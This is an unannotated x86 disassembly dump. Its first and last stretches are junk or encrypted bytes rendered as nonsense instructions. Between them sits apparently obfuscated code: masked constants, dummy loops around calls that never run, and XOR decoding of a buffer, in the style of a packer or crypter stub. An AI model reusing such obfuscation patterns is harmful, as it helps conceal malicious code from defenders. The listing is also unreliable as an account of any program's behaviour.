  407eee:	adc    bh,ah
  407ef0:	jecxz  0x407ee8
  407ef2:	push   esi
  407ef3:	mov    bh,0xbc
  407ef5:	xchg   DWORD PTR [edx-0x105047a1],edi
  407efb:	lahf   
  407efc:	das    
  407efd:	stos   BYTE PTR es:[edi],al
  407efe:	shl    DWORD PTR [edx+0x6c],1
  407f01:	jmp    0xb91685f8
  407f06:	dec    edi
  407f07:	sbb    ah,dh
  407f09:	sub    dh,BYTE PTR [edx+edi*1+0x61]
  407f0d:	mov    bh,0xc7
  407f0f:	xor    BYTE PTR [ebp+eiz*1-0x49],ah
  407f13:	sub    al,0xae
  407f15:	(bad)  
  407f16:	sbb    eax,eax
  407f18:	outs   dx,DWORD PTR ds:[esi]
  407f19:	nop
  407f1a:	mov    DWORD PTR [edi],ebx
  407f1c:	std    
  407f1d:	add    eax,0xadddb9b1
  407f22:	inc    edx
  407f23:	es xchg di,ax
  407f26:	dec    esi
  407f27:	out    0xe3,al
  407f29:	loopne 0x407f66
  407f2b:	dec    ebx
  407f2c:	and    DWORD PTR [esi+0x27],eax
  407f2f:	cmp    BYTE PTR [ecx+ebp*4+0x16],ah
  407f33:	retf   
  407f34:	fst    QWORD PTR [edi-0x5364d0bc]
  407f3a:	dec    ecx
  407f3b:	and    BYTE PTR [esi-0x24],0x74
  407f3f:	mov    ch,0x66
  407f41:	or     cl,BYTE PTR [ecx-0x6067db5b]
  407f47:	dec    ecx
  407f48:	xchg   edx,eax
  407f49:	ds cmp eax,0xa2fa43ae
  407f4f:	adc    al,0x6d
  407f51:	add    bh,BYTE PTR [ebp-0x76]
  407f54:	jne    0x4080f8
  407f5a:	mov    eax,DWORD PTR [ebp-0xc]
  407f5d:	neg    ecx
  407f5f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  407f66:	adc    ecx,eax
  407f68:	mov    eax,DWORD PTR [ebp-0x28]
  407f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  407f6e:	not    DWORD PTR ds:0x42a2da
  407f74:	xor    eax,esi
  407f76:	or     DWORD PTR ds:0x42a2fa,0xa4f
  407f80:	xor    ecx,esi
  407f82:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  407f8c:	add    eax,edi
  407f8e:	add    ecx,edi
  407f90:	mov    BYTE PTR [ebp-0x21],dl
  407f93:	cmp    eax,ecx
  407f95:	jae    0x408098
  407f9b:	add    edx,DWORD PTR ds:0x42a2a2
  407fa1:	lea    ecx,[eax-0x3272f1]
  407fa7:	mov    DWORD PTR [ebp-0x14],ecx
  407faa:	sub    DWORD PTR ds:0x42a27a,0x2374
  407fb4:	mov    edx,DWORD PTR [ebp-0x14]
  407fb7:	add    DWORD PTR ds:0x42a2a2,0x6412
  407fc1:	xor    edx,esi
  407fc3:	add    edx,0x7f55d8fb
  407fc9:	lea    ecx,[ebp+eax*4-0xb4]
  407fd0:	mov    DWORD PTR ds:0x42a25a,0x798e
  407fda:	mov    DWORD PTR [ecx],edx
  407fdc:	mov    edx,0x1097
  407fe1:	mov    edx,DWORD PTR [ecx]
  407fe3:	cmp    edx,0x244ecb98
  407fe9:	jbe    0x408004
  407fef:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  407ff9:	add    DWORD PTR [ecx],0x405fcd9
  407fff:	jmp    0x40800a
  408004:	add    DWORD PTR [ecx],0xfdaf4327
  40800a:	or     DWORD PTR ds:0x42a2f6,edi
  408010:	mov    ecx,DWORD PTR [ebp-0x18]
  408013:	xor    ecx,esi
  408015:	and    DWORD PTR ds:0x42a25e,0x42a27a
  40801f:	inc    eax
  408020:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  40802a:	inc    DWORD PTR [ebp-0x14]
  40802d:	add    ecx,edi
  40802f:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  408039:	cmp    eax,ecx
  40803b:	mov    DWORD PTR ds:0x42a2fe,0x33af
  408045:	jb     0x407faa
  40804b:	and    DWORD PTR ds:0x42a25e,0x0
  408055:	mov    eax,ds:0x42a25e
  40805a:	inc    eax
  40805b:	mov    ds:0x42a25e,eax
  408060:	cmp    DWORD PTR ds:0x42a25e,0x1c
  408067:	jb     0x408095
  40806d:	jmp    0x408088
  408072:	push   0x6d6b
  408077:	push   0x44a2
  40807c:	push   DWORD PTR [ebp-0x14]
  40807f:	push   DWORD PTR [ebp-0x18]
  408082:	call   DWORD PTR ds:0x42a3de
  408088:	cmp    DWORD PTR ds:0x42a25e,0x18
  40808f:	jb     0x408055
  408095:	mov    dl,BYTE PTR [ebp-0x21]
  408098:	mov    eax,DWORD PTR [ebp-0x34]
  40809b:	xor    al,0xaa
  40809d:	mov    cl,0xf
  40809f:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  4080a9:	sub    cl,al
  4080ab:	add    dl,cl
  4080ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  4080b0:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  4080ba:	xor    cl,0xaa
  4080bd:	xor    DWORD PTR ds:0x42a296,0x4bb3
  4080c7:	sub    cl,0xf
  4080ca:	add    DWORD PTR ds:0x42a2d6,0x42a2da
  4080d4:	ror    dl,cl
  4080d6:	sub    ecx,0x38f7
  4080dc:	xor    eax,eax
  4080de:	xor    DWORD PTR ds:0x42a2d2,0x8c7
  4080e8:	mov    eax,DWORD PTR [ebp-0xc]
  4080eb:	dec    DWORD PTR ds:0x42a266
  4080f1:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  4080f8:	and    DWORD PTR ds:0x42a296,0x0
  408102:	mov    eax,ds:0x42a296
  408107:	inc    eax
  408108:	mov    ds:0x42a296,eax
  40810d:	cmp    DWORD PTR ds:0x42a296,0x27
  408114:	ja     0x408132
  40811a:	jmp    0x408125
  40811f:	call   DWORD PTR ds:0x42a3e2
  408125:	cmp    DWORD PTR ds:0x42a296,0x1b
  40812c:	jb     0x408102
  408132:	mov    eax,DWORD PTR [ebp-0xc]
  408135:	xor    ecx,DWORD PTR ds:0x42a2c6
  40813b:	mov    ecx,DWORD PTR [ebp-0x28]
  40813e:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  408148:	sub    eax,edi
  40814a:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  408154:	xor    eax,esi
  408156:	mov    DWORD PTR ds:0x42a296,0x3de6
  408160:	cmp    eax,ecx
  408162:	mov    DWORD PTR ds:0x42a292,0x568e
  40816c:	jne    0x408200
  408172:	add    ecx,eax
  408174:	mov    eax,DWORD PTR [ebp-0x8]
  408177:	and    DWORD PTR ds:0x42a2ee,0x0
  408181:	mov    ecx,DWORD PTR ds:0x42a2ee
  408187:	inc    ecx
  408188:	mov    DWORD PTR ds:0x42a2ee,ecx
  40818e:	cmp    DWORD PTR ds:0x42a2ee,0x6
  408195:	jbe    0x4081df
  40819b:	jmp    0x4081b8
  4081a0:	push   0x42a296
  4081a5:	push   DWORD PTR [ebp-0x20]
  4081a8:	push   0x42903c
  4081ad:	push   0x4290aa
  4081b2:	call   DWORD PTR ds:0x42a3ea
  4081b8:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4081bf:	jne    0x4081d2
  4081c5:	mov    ecx,DWORD PTR ds:0x42a2ee
  4081cb:	inc    ecx
  4081cc:	mov    DWORD PTR ds:0x42a2ee,ecx
  4081d2:	cmp    DWORD PTR ds:0x42a2ee,0x15
  4081d9:	jb     0x408181
  4081df:	mov    ecx,DWORD PTR [ebp-0x10]
  4081e2:	xor    eax,esi
  4081e4:	xor    ecx,esi
  4081e6:	sub    eax,ecx
  4081e8:	sub    eax,edi
  4081ea:	xor    eax,esi
  4081ec:	mov    DWORD PTR [ebp-0x8],eax
  4081ef:	mov    eax,DWORD PTR [ebp-0x10]
  4081f2:	xor    eax,esi
  4081f4:	mov    ecx,0xffcd8d8f
  4081f9:	sub    ecx,eax
  4081fb:	jmp    0x40820f
  408200:	mov    eax,DWORD PTR [ebp-0x10]
  408203:	xor    eax,esi
  408205:	mov    ecx,0xffcd8d0f
  40820a:	sub    ecx,eax
  40820c:	add    ecx,DWORD PTR [ebp-0xc]
  40820f:	mov    DWORD PTR [ebp-0xc],ecx
  408212:	mov    eax,DWORD PTR [ebp-0x8]
  408215:	cmp    eax,0xf89c85a5
  40821a:	jne    0x4037d5
  408220:	mov    DWORD PTR [ebp-0x34],0x9
  408227:	mov    ecx,DWORD PTR [ebp+0x8]
  40822a:	xor    ecx,esi
  40822c:	add    ecx,edi
  40822e:	jmp    0x40848e
  408233:	lea    eax,[ecx+ebx*1]
  408236:	mov    DWORD PTR [ebp-0x2c],eax
  408239:	mov    eax,DWORD PTR [ebp-0x58]
  40823c:	sub    eax,ecx
  40823e:	mov    DWORD PTR [ebp-0x1c],eax
  408241:	mov    eax,DWORD PTR [ebp-0x1c]
  408244:	mov    DWORD PTR [ebp-0x14],eax
  408247:	mov    eax,DWORD PTR [ebp-0x2c]
  40824a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  408251:	mov    DWORD PTR [ebp-0x54],eax
  408254:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40825b:	mov    eax,DWORD PTR [ebp-0x38]
  40825e:	xor    eax,esi
  408260:	add    eax,edi
  408262:	mov    DWORD PTR [ebp-0x10],eax
  408265:	mov    eax,DWORD PTR [ebp-0x38]
  408268:	xor    eax,esi
  40826a:	add    eax,edi
  40826c:	mov    DWORD PTR [ebp-0x8],eax
  40826f:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  408276:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40827d:	mov    eax,DWORD PTR [ebp-0x38]
  408280:	mov    edx,DWORD PTR [ebp-0x14]
  408283:	xor    eax,esi
  408285:	add    eax,edi
  408287:	cmp    edx,eax
  408289:	je     0x408482
  40828f:	mov    eax,DWORD PTR [ebp-0x20]
  408292:	xor    eax,esi
  408294:	mov    edx,0xffcd8d0f
  408299:	sub    edx,eax
  40829b:	add    edx,DWORD PTR [ebp-0x14]
  40829e:	mov    eax,DWORD PTR [ebp-0x20]
  4082a1:	mov    ebx,DWORD PTR [ebp-0x10]
  4082a4:	xor    eax,esi
  4082a6:	add    eax,edi
  4082a8:	imul   eax,ebx
  4082ab:	cmp    eax,edx
  4082ad:	ja     0x40847f
  4082b3:	mov    edx,DWORD PTR [ebp-0x10]
  4082b6:	mov    eax,DWORD PTR [ebp-0x14]
  4082b9:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082bc:	sub    eax,edx
  4082be:	xor    ebx,esi
  4082c0:	xor    edx,edx
  4082c2:	add    ebx,edi
  4082c4:	div    ebx
  4082c6:	mov    DWORD PTR [ebp-0x8],eax
  4082c9:	mov    eax,DWORD PTR [ebp-0x44]
  4082cc:	mov    edx,DWORD PTR [ebp-0x8]
  4082cf:	xor    eax,esi
  4082d1:	add    eax,edi
  4082d3:	cmp    edx,eax
  4082d5:	jbe    0x4082e5
  4082db:	mov    eax,DWORD PTR [ebp-0x44]
  4082de:	xor    eax,esi
  4082e0:	add    eax,edi
  4082e2:	mov    DWORD PTR [ebp-0x8],eax
  4082e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4082e8:	mov    edx,DWORD PTR [ebp-0x8]
  4082eb:	xor    eax,esi
  4082ed:	add    eax,edi
  4082ef:	imul   eax,edx
  4082f2:	mov    DWORD PTR [ebp-0x8],eax
  4082f5:	mov    eax,DWORD PTR [ebp-0x38]
  4082f8:	mov    edx,DWORD PTR [ebp-0x8]
  4082fb:	xor    eax,esi
  4082fd:	add    eax,edi
  4082ff:	cmp    edx,eax
  408301:	je     0x408468
  408307:	mov    eax,DWORD PTR [ebp-0x8]
  40830a:	mov    DWORD PTR [ebp-0x18],eax
  40830d:	mov    eax,DWORD PTR [ebp-0x10]
  408310:	add    eax,DWORD PTR [ebp-0x54]
  408313:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40831a:	mov    DWORD PTR [ebp-0x8],eax
  40831d:	mov    eax,0xf89c85ba
  408322:	mov    DWORD PTR [ebp-0x28],eax
  408325:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40832c:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  408333:	mov    DWORD PTR [ebp-0x30],eax
  408336:	mov    eax,DWORD PTR [ebp-0x1c]
  408339:	xor    eax,esi
  40833b:	add    eax,edi
  40833d:	jmp    0x408424
  408342:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  408349:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  408350:	mov    eax,DWORD PTR [ebp-0x30]
  408353:	mov    edx,DWORD PTR [ebp-0xc]
  408356:	xor    eax,esi
  408358:	add    eax,edi
  40835a:	imul   eax,edx
  40835d:	mov    edx,DWORD PTR [ebp-0x8]
  408360:	mov    al,BYTE PTR [eax+edx*1]
  408363:	mov    BYTE PTR [ebp-0x1],al
  408366:	mov    eax,DWORD PTR [ebp-0x30]
  408369:	mov    edx,DWORD PTR [ebp-0xc]
  40836c:	xor    eax,esi
  40836e:	add    eax,edi
  408370:	imul   eax,edx
  408373:	mov    edx,DWORD PTR [ebp-0x5c]
  408376:	xor    edx,esi
  408378:	add    eax,edx
  40837a:	mov    edx,DWORD PTR [ebp-0x8]
  40837d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  408385:	mov    edx,DWORD PTR [ebp-0x4c]
  408388:	xor    edx,esi
  40838a:	lea    eax,[edx+eax*1+0x3272f1]
  408391:	movzx  edx,BYTE PTR [ebp-0x1]
  408395:	xor    edx,eax
  408397:	mov    BYTE PTR [ebp-0x1],dl
  40839a:	mov    al,BYTE PTR [ebp-0x1]
  40839d:	mov    edx,DWORD PTR [ebp-0x30]
  4083a0:	mov    ebx,DWORD PTR [ebp-0xc]
  4083a3:	xor    edx,esi
  4083a5:	add    edx,edi
  4083a7:	imul   edx,ebx
  4083aa:	mov    ebx,DWORD PTR [ebp-0x8]
  4083ad:	mov    BYTE PTR [edx+ebx*1],al
  4083b0:	mov    eax,DWORD PTR [ebp-0x30]
  4083b3:	mov    edx,DWORD PTR [ebp-0xc]
  4083b6:	xor    eax,esi
  4083b8:	add    eax,edi
  4083ba:	imul   eax,edx
  4083bd:	mov    edx,DWORD PTR [ebp-0x8]
  4083c0:	mov    al,BYTE PTR [eax+edx*1]
  4083c3:	mov    BYTE PTR [ebp-0x1],al
  4083c6:	mov    eax,DWORD PTR [ebp-0x30]
  4083c9:	mov    edx,DWORD PTR [ebp-0xc]
  4083cc:	xor    eax,esi
  4083ce:	add    eax,edi
  4083d0:	imul   eax,edx
  4083d3:	mov    edx,DWORD PTR [ebp-0x28]
  4083d6:	xor    edx,esi
  4083d8:	add    eax,edx
  4083da:	mov    edx,DWORD PTR [ebp-0x8]
  4083dd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  4083e5:	mov    edx,DWORD PTR [ebp-0x50]
  4083e8:	xor    edx,esi
  4083ea:	lea    eax,[edx+eax*1+0x3272f1]
  4083f1:	movzx  edx,BYTE PTR [ebp-0x1]
  4083f5:	xor    edx,eax
  4083f7:	mov    BYTE PTR [ebp-0x1],dl
  4083fa:	mov    al,BYTE PTR [ebp-0x1]
  4083fd:	mov    edx,DWORD PTR [ebp-0x30]
  408400:	mov    ebx,DWORD PTR [ebp-0xc]
  408403:	xor    edx,esi
  408405:	add    edx,edi
  408407:	imul   edx,ebx
  40840a:	mov    ebx,DWORD PTR [ebp-0x8]
  40840d:	mov    BYTE PTR [edx+ebx*1],al
  408410:	mov    eax,DWORD PTR [ebp-0x40]
  408413:	mov    edx,DWORD PTR [ebp-0x28]
  408416:	xor    eax,esi
  408418:	xor    edx,esi
  40841a:	add    eax,edi
  40841c:	add    edx,edi
  40841e:	imul   eax,edx
  408421:	add    eax,DWORD PTR [ebp-0xc]
  408424:	mov    DWORD PTR [ebp-0xc],eax
  408427:	mov    eax,DWORD PTR [ebp-0xc]
  40842a:	mov    edx,DWORD PTR [ebp-0x18]
  40842d:	cmp    edx,eax
  40842f:	jb     0x408342
  408435:	mov    eax,DWORD PTR [ebp-0x28]
  408438:	mov    edx,DWORD PTR [ebp-0x18]
  40843b:	xor    eax,esi
  40843d:	add    eax,edi
  40843f:	imul   eax,edx
  408442:	mov    edx,DWORD PTR [ebp-0x1c]
  408445:	xor    edx,esi
  408447:	add    edx,edi
  408449:	or     eax,edx
  40844b:	mov    edx,DWORD PTR [ebp-0x20]
  40844e:	xor    edx,esi
  408450:	add    eax,edx
  408452:	mov    edx,DWORD PTR [ebp-0x20]
  408455:	xor    edx,esi
  408457:	add    eax,edx
  408459:	mov    edx,DWORD PTR [ebp-0x10]
  40845c:	lea    eax,[eax+edx*1+0x64e5e2]
  408463:	jmp    0x408477
  408468:	mov    eax,DWORD PTR [ebp-0x20]
  40846b:	mov    edx,DWORD PTR [ebp-0x10]
  40846e:	xor    eax,esi
  408470:	lea    eax,[eax+edx*1+0x3272f1]
  408477:	mov    DWORD PTR [ebp-0x10],eax
  40847a:	jmp    0x40828f
  40847f:	mov    ebx,DWORD PTR [ebp-0x3c]
  408482:	mov    eax,DWORD PTR [ebp+0xc]
  408485:	xor    eax,esi
  408487:	lea    ecx,[ecx+eax*1+0x3272f1]
  40848e:	lea    eax,[ecx-0x3272f1]
  408494:	xor    eax,esi
  408496:	cmp    eax,0xf89c95a5
  40849b:	jne    0x408233
  4084a1:	dec    DWORD PTR [ebp-0x34]
  4084a4:	jne    0x408227
  4084aa:	mov    eax,DWORD PTR [ebp+0x8]
  4084ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4084b0:	mov    edx,DWORD PTR [ebp+0x8]
  4084b3:	xor    ecx,esi
  4084b5:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  4084bc:	xor    eax,esi
  4084be:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  4084c5:	xor    edx,esi
  4084c7:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  4084ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4084d1:	xor    ecx,esi
  4084d3:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	add    eax,edi
  4084e1:	pop    edi
  4084e2:	pop    esi
  4084e3:	pop    ebx
  4084e4:	leave  
  4084e5:	ret    0x8
  4084e8:	xor    eax,eax
  4084ea:	and    DWORD PTR ds:0x42a2f6,0x42a2fa
  4084f4:	inc    eax
  4084f5:	ret    
  4084f6:	push   ebp
  4084f7:	mov    ebp,esp
  4084f9:	sub    esp,0x38
  4084fc:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  408503:	push   ebx
  408504:	mov    DWORD PTR ds:0x42a29a,0x1c
  40850e:	cmp    DWORD PTR ds:0x42a29a,0x0
  408515:	je     0x408551
  40851b:	cmp    DWORD PTR ds:0x42a29a,0x21
  408522:	jg     0x408551
  408528:	jmp    0x40853e
  40852d:	push   DWORD PTR [ebp-0x28]
  408530:	push   0x42a2b2
  408535:	push   DWORD PTR [ebp-0x18]
  408538:	call   DWORD PTR ds:0x42a3ee
  40853e:	xor    eax,eax
  408540:	xor    eax,DWORD PTR ds:0x42a29a
  408546:	dec    eax
  408547:	mov    ds:0x42a29a,eax
  40854c:	jmp    0x40850e
  408551:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  408558:	and    DWORD PTR ds:0x42a292,ebx
  40855e:	mov    eax,DWORD PTR [ebp-0x4]
  408561:	push   esi
  408562:	mov    esi,0x75108aa
  408567:	sub    DWORD PTR ds:0x42a28a,0x606e
  408571:	xor    eax,esi
  408573:	push   edi
  408574:	mov    edi,0x3272f1
  408579:	add    eax,edi
  40857b:	add    DWORD PTR ds:0x42a28e,0x42a2ae
  408585:	mov    DWORD PTR [ebp-0x1c],eax
  408588:	mov    eax,DWORD PTR [ebp+0x14]
  40858b:	xor    DWORD PTR ds:0x42a2de,0x42a302
  408595:	test   eax,eax
  408597:	je     0x4085af
  40859d:	mov    eax,DWORD PTR [ebp+0x14]
  4085a0:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR [ebp-0x1c],eax
  4085af:	mov    ebx,DWORD PTR ds:0x42a256
  4085b5:	and    DWORD PTR ds:0x42a2e6,ebx
  4085bb:	mov    eax,DWORD PTR [ebp-0x4]
  4085be:	xor    eax,esi
  4085c0:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  4085ca:	add    eax,edi
  4085cc:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  4085d6:	mov    DWORD PTR [ebp-0x8],eax
  4085d9:	mov    eax,DWORD PTR [ebp-0xc]
  4085dc:	dec    DWORD PTR ds:0x42a2be
  4085e2:	xor    eax,esi
  4085e4:	add    eax,edi
  4085e6:	and    DWORD PTR ds:0x42a2be,0x0
  4085f0:	jmp    0x408602
  4085f5:	mov    ebx,DWORD PTR ds:0x42a2be
  4085fb:	inc    ebx
  4085fc:	mov    DWORD PTR ds:0x42a2be,ebx
  408602:	cmp    DWORD PTR ds:0x42a2be,0x13
  408609:	jae    0x408650
  40860f:	cmp    DWORD PTR ds:0x42a2be,0x4
  408616:	jb     0x408650
  40861c:	jmp    0x408631
  408621:	push   0x68db
  408626:	push   0x42a266
  40862b:	call   DWORD PTR ds:0x42a3f2
  408631:	cmp    DWORD PTR ds:0x42a2be,0x3
  408638:	jne    0x40864b
  40863e:	mov    ebx,DWORD PTR ds:0x42a2be
  408644:	inc    ebx
  408645:	mov    DWORD PTR ds:0x42a2be,ebx
  40864b:	jmp    0x4085f5
  408650:	mov    DWORD PTR [ebp-0x24],eax
  408653:	mov    ebx,DWORD PTR ds:0x42a316
  408659:	mov    ebx,DWORD PTR [ebx]
  40865b:	xor    DWORD PTR ds:0x42a2ae,ebx
  408661:	mov    eax,DWORD PTR [ebp-0x4]
  408664:	mov    DWORD PTR ds:0x42a2fa,0x14
  40866e:	cmp    DWORD PTR ds:0x42a2fa,0x0
  408675:	je     0x4086aa
  40867b:	cmp    DWORD PTR ds:0x42a2fa,0x16
  408682:	jbe    0x4086aa
  408688:	jmp    0x408698
  40868d:	push   0x42a256
  408692:	call   DWORD PTR ds:0x42a3f6
  408698:	mov    ebx,DWORD PTR ds:0x42a2fa
  40869e:	dec    ebx
  40869f:	mov    DWORD PTR ds:0x42a2fa,ebx
  4086a5:	jmp    0x40866e
  4086aa:	xor    eax,esi
  4086ac:	movzx  ebx,BYTE PTR ds:0x42a2aa
  4086b3:	adc    ebx,DWORD PTR ds:0x42a2de
  4086b9:	mov    DWORD PTR ds:0x42a2aa,ebx
  4086bf:	add    eax,edi
  4086c1:	mov    DWORD PTR ds:0x42a29e,0x16
  4086cb:	cmp    DWORD PTR ds:0x42a29e,0x0
  4086d2:	je     0x408713
  4086d8:	cmp    DWORD PTR ds:0x42a29e,0x1e
  4086df:	jle    0x408713
  4086e5:	jmp    0x4086ff
  4086ea:	push   0x8495
  4086ef:	push   0x42a2a2
  4086f4:	push   0x13ea
  4086f9:	call   DWORD PTR ds:0x42a3fa
  4086ff:	xor    ebx,ebx
  408701:	add    ebx,DWORD PTR ds:0x42a29e
  408707:	dec    ebx
  408708:	mov    DWORD PTR ds:0x42a29e,ebx
  40870e:	jmp    0x4086cb
  408713:	mov    DWORD PTR [ebp-0x30],eax
  408716:	sub    DWORD PTR ds:0x42a2b2,0x244c
  408720:	mov    ebx,DWORD PTR [ebp-0x4]
  408723:	xor    ebx,esi
  408725:	neg    DWORD PTR ds:0x42a2f6
  40872b:	add    ebx,edi
  40872d:	and    DWORD PTR ds:0x42a2ba,0x0
  408737:	xor    eax,eax
  408739:	or     eax,DWORD PTR ds:0x42a2ba
  40873f:	inc    eax
  408740:	mov    ds:0x42a2ba,eax
  408745:	cmp    DWORD PTR ds:0x42a2ba,0x6
  40874c:	jg     0x408791
  408752:	jmp    0x40876c
  408757:	push   0x385f
  40875c:	push   0x7a18
  408761:	push   0x5bac
  408766:	call   DWORD PTR ds:0x42a402
  40876c:	cmp    DWORD PTR ds:0x42a2ba,0x5
  408773:	jne    0x408784
  408779:	mov    eax,ds:0x42a2ba
  40877e:	inc    eax
  40877f:	mov    ds:0x42a2ba,eax
  408784:	cmp    DWORD PTR ds:0x42a2ba,0x13
  40878b:	jb     0x408737
  408791:	mov    eax,DWORD PTR [ebp-0x24]
  408794:	add    DWORD PTR ds:0x42a27e,0x42a26e
  40879e:	sub    eax,edi
  4087a0:	lea    ecx,[ebx-0x3272f1]
  4087a6:	xor    eax,esi
  4087a8:	sbb    DWORD PTR ds:0x42a286,0x7a3b
  4087b2:	jmp    0x40ab40
  4087b7:	inc    esp
  4087b8:	arpl   WORD PTR [esi+esi*8],di
  4087bb:	and    al,0x96
  4087bd:	xchg   ch,cl
  4087bf:	sahf   
  4087c0:	pushf  
  4087c1:	ja     0x4087a5
  4087c3:	stc    
  4087c4:	enter  0xc10b,0xcf
  4087c8:	adc    al,0x83
  4087ca:	or     DWORD PTR [esi+ebx*2],0xffffff83
  4087ce:	and    DWORD PTR [edx+0x7420cfbe],0x2f
  4087d5:	sti    
  4087d6:	iret   
  4087d7:	pushfw 
  4087d9:	sbb    esp,DWORD PTR [ebp+0x1de3d885]
  4087df:	jp     0x4087d8
  4087e1:	nop
  4087e2:	nop
  4087e3:	xchg   edx,eax
  4087e4:	dec    ebx
  4087e5:	in     al,dx
  4087e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087e7:	sahf   
  4087e8:	adc    DWORD PTR [ecx-0x203de9e4],esi
  4087ee:	mov    ebx,0x84a0e1d8
  4087f3:	fisub  WORD PTR [edi+eiz*2+0x6]
  4087f7:	popf   
  4087f8:	popf   
  4087f9:	fstp   TBYTE PTR [eax]
  4087fb:	pop    esi
  4087fc:	pop    ds
  4087fd:	dec    esp
  4087fe:	sti    
  4087ff:	mov    bh,0x25
  408801:	push   es
  408802:	mov    eax,0xa8ee6c83
  408807:	xor    ah,ah
  408809:	stc    
  40880a:	lods   eax,DWORD PTR ds:[esi]
  40880b:	psllq  mm6,QWORD PTR [ebx+0x25]
  40880f:	push   ecx
  408810:	xor    al,0x34
  408812:	inc    ecx
  408813:	mov    edi,0x68bd6365
  408818:	pushf  
  408819:	dec    eax
  40881a:	es xchg edi,eax
  40881c:	or     DWORD PTR [ecx],0x6f9cec25
  408822:	icebp  
  408823:	pop    esi
  408824:	lea    esi,[ebx+0x3a]
  408827:	jmp    0x4087d9
  408829:	gs scas eax,DWORD PTR es:[edi]
  40882b:	inc    ebp
  40882c:	inc    ebp
  40882d:	in     eax,dx
  40882e:	test   DWORD PTR [edi-0x4c],eax
  408831:	cld    
  408832:	aam    0x1d
  408834:	or     BYTE PTR [eax],bh
  408836:	nop
  408837:	mov    bh,0xc5
  408839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883a:	iret   
  40883b:	and    ebx,DWORD PTR [edi]
  40883d:	test   BYTE PTR [esi-0x78],al
  408840:	mov    eax,ds:0x7e5a11a7
  408845:	jo     0x4088c2
  408847:	jecxz  0x4087e8
  408849:	pop    ecx
  40884a:	icebp  
  40884b:	add    BYTE PTR [edi],bh
  40884d:	out    dx,al
  40884e:	push   ecx
  40884f:	ror    DWORD PTR gs:[edi+ebx*4],cl
  408853:	adc    ch,cl
  408855:	sbb    dl,al
  408857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408858:	in     eax,0x0
  40885a:	or     al,dh
  40885c:	ds xchg edi,eax
  40885e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885f:	daa    
  408860:	push   DWORD PTR [ebx+0x391c182]
  408866:	call   0x9b212a66
  40886b:	adc    edi,DWORD PTR [esi-0x4c]
  40886e:	jno    0x40888c
  408870:	mov    DWORD PTR [edx+0x9fbe99a],0xba096c35
  40887a:	inc    edi
  40887b:	jle    0x408819
  40887d:	idiv   dh
  40887f:	ins    BYTE PTR es:[edi],dx
  408880:	cld    
  408881:	adc    al,0x94
  408883:	rol    BYTE PTR [edx-0x773ab9eb],1
  408889:	push   esi
  40888a:	adc    DWORD PTR [ebx],ecx
  40888c:	and    al,0x14
  40888e:	adc    al,0x9b
  408890:	jg     0x40881f
  408892:	jae    0x4088c3
  408894:	arpl   WORD PTR ds:0x26e0e79,bx
  40889a:	ins    BYTE PTR es:[edi],dx
  40889b:	lahf   
  40889c:	retf   
  40889d:	popa   
  40889e:	jecxz  0x4088ef
  4088a0:	mov    al,ds:0x30c03948
  4088a5:	mov    ecx,0x7e4bf9d8
  4088aa:	pop    edi
  4088ab:	clc    
  4088ac:	cmp    al,0x18
  4088ae:	dec    esi
  4088af:	add    BYTE PTR [esi-0x5c765eaf],dl
  4088b5:	cs mov bl,0x5a
  4088b8:	(bad)  
  4088b9:	stos   DWORD PTR es:[edi],eax
  4088ba:	fcom   QWORD PTR [ebx+0x26]
  4088bd:	jge    0x40893c
  4088bf:	xchg   BYTE PTR gs:[edi+0x3e],ah
  4088c3:	jbe    0x40889f
  4088c5:	pop    ecx
  4088c6:	(bad)  
  4088c7:	rcr    BYTE PTR [edx],cl
  4088c9:	sbb    eax,0xa450dbca
  4088ce:	(bad)  
  4088cf:	mov    edi,DWORD PTR [ebx+0x509106a9]
  4088d5:	mov    bl,BYTE PTR [edx+0x41]
  4088d8:	stos   DWORD PTR es:[edi],eax
  4088d9:	xchg   edx,eax
  4088da:	add    DWORD PTR [ebp+0xd],ebp
  4088dd:	sahf   
  4088de:	or     bl,BYTE PTR [ecx+edi*2]
  4088e1:	pop    esp
  4088e2:	adc    DWORD PTR [edi+0x21ee69b0],ecx
  4088e8:	adc    eax,0xaaae98a2
  4088ed:	int    0x40
